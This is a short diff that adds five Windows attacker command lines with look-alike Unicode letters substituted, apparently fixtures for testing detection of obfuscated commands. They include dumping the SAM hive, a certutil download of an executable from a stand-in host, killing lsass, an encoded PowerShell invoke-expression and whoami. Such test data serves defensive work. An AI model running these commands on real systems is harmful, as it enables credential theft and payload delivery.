@@ -1,0 +1,5 @@
+reg ˢave hklm\sam 1.hiv
+certutil -ᵁrlcache -ˢplit -ᶠ http://www.test.com/x.exe
+taskkill /ᶠ /im lsass.exe
+powershell -enc SQBFAFgA
+whoami
